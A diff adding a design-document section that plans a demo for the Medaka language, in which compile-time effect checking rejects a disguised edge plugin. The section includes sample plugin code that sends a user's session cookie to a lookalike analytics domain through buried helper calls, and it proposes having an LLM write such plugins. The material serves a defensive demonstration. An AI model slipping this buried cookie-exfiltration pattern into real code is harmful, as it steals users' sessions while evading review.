@@ -311,6 +311,85 @@ Wasm boundary too, not just in the types.
 | `recoWidget` reads another plugin's `Context` internals | only typed fields exposed; no accessor exists |
 | any plugin uses the network under store42's policy | `⊄ {}` effective bound → rejected at install |
 
+## 7c. The minimal "wow" demo (the first shareable artifact)
+
+The thinnest end-to-end slice that lands the punch — and the concrete target that
+near-term PLAN items (fine-grained labels + a thin harness) aim at. Guiding
+principle: **truthful** (the guarantee is real) but **minimal** (stub everything
+that isn't the story). **The story is compile-time capability verification, which is
+decoupled from the backend** — it's true and compelling on the *existing tree-walker*,
+years before native code exists. That decoupling is the point: the
+"make-people-care" milestone is reachable cheaply.
+
+**One line:** *Submit an AI-generated edge plugin that tries to exfiltrate user
+data. A JS platform would deploy it. Medaka's compiler rejects it automatically — no
+human reviewed it — because it proved the plugin reaches the network, even though the
+call is buried several helpers deep.*
+
+**The ~90-second script:**
+1. "Contract for an edge transform plugin: may use `<Cache, Log>`, nothing else."
+2. Submit a **good** plugin → `✅ accepted` → it *runs* (interpreter) and rewrites a
+   header. Safe code works.
+3. Submit a **malicious** plugin that looks like normal analytics → `❌ rejected`:
+   ```
+   transform requires <Fetch> — not permitted by policy {Cache, Log}
+     reached via: transform → tagVisit → recordMetric → sendBeacon → fetch
+   ```
+4. Punchline: no human looked at it; the exfiltration was four calls deep, past where
+   review and `grep` give up; the type system found it.
+
+**The malicious plugin — exfiltration buried deep (what makes it credible):**
+```
+sendBeacon (url, body) = fetch url body                       -- uses <Fetch>
+recordMetric ev        = sendBeacon ("https://analytics-cdn.io/c", ev)
+tagVisit req           = recordMetric (sessionCookie req)     -- ships the cookie
+transform req =
+  let _ = tagVisit req            -- the poison: pulls <Fetch> up the call graph
+  cacheAndReturn (rewrite req)
+```
+Effect **propagation** carries `<Fetch>` up `fetch → sendBeacon → recordMetric →
+tagVisit → transform`; inferred row `{Fetch, Cache, Log} ⊄ {Cache, Log}` → reject,
+**with the chain printed.** The "via" chain is the money shot — it shows this is a
+*proof through the call graph*, not `grep fetch`, and is a live demonstration of why
+soundness (already shipped) matters.
+
+**The harness (~150–250 lines, the "automated reviewer"):** submitted file → compile
++ typecheck → read `transform`'s inferred effect row → check `⊆ policy` → accept (and
+run) or reject with reason + chain. That is the entire demo "platform."
+
+**What it needs to build:**
+| Piece | Status |
+|---|---|
+| Effect soundness/propagation (makes the rejection trustworthy) | ✅ done (Phase 79/146) |
+| User-definable fine-grained labels (`effect Fetch/Cache/Log`) | 🔨 the one real language piece — PLAN near-term item 5 |
+| The harness | 🔨 small, demo-only, new |
+| LLVM / WasmGC / real edge host / parameterized effects / full platform | ❌ not needed |
+
+So the demo ≈ **the next roadmap item (gap-2 labels) + a thin harness, on the
+existing interpreter.**
+
+**Credibility checklist (don't skip):**
+- Malicious code must be **plausible** (buried, lookalike domain, reads like real
+  telemetry) — if it's obviously evil, skeptics say "review would catch that."
+- Bury `fetch` **several calls deep** — proves proof-through-call-graph, not
+  pattern-matching.
+- **Show the good plugin run** — "safe works, unsafe blocked," both halves.
+- Keep plugin code **clean/readable** — the anti-ivory-tower identity.
+- **Scope the claim honestly** — at demo stage the plugin runs on the tree-walker
+  (not memory-sandboxed, not fast). The demo proves *automated capability
+  verification* (the differentiated part); native/Wasm sandbox + perf is the
+  production build-out. Say so — a technical audience will ask.
+
+**Format:** a writeup/blog post (the thing that travels — Show HN / Lobsters / Wasm +
+PL crowds) + a ~90s asciinema + a runnable repo. A web playground (removes the
+install barrier) is the highest-leverage *next* step; defer past v1.
+
+**Stretch upgrades (after the base lands), by visceral punch:** (1) generate the
+malicious plugin with an actual LLM in the demo (AI-guardrail thesis, ~zero extra
+build); (2) parameterized pinned domain (Phase 146b) — "allowed IdP passes,
+`evil.com` rejected"; (3) the segregation example (§7) — "reads cookies AND fetches,
+provably can't send cookies to the network."
+
 ## 8. Honest boundaries / non-goals
 
 - **Capability effects cover *authority*, not *resources*.** A pure function can
